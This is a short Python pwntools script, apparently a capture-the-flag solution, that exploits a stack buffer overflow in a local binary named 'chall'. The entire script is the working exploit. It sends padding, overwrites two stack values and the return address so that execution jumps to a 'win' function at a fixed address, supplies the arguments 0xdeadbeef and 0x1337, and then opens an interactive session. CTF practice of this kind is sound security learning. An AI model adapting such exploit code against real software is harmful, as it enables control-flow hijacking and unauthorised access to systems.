from pwn import *

#p = gdb.debug('./chall', gdbscript='b *vuln+65')
p = process('./chall')

padding = b'A'*32

win_addr = p32(0x80491d6)

p.recv()

p.sendline(padding + b'\xf4\x01\x00\x00' + b'\x90\x01\x00\x00' + b'A'*12 + win_addr + b'A'*4 + b'\xef\xbe\xad\xde' + b'\x37\x13\x00\x00')

p.interactive()
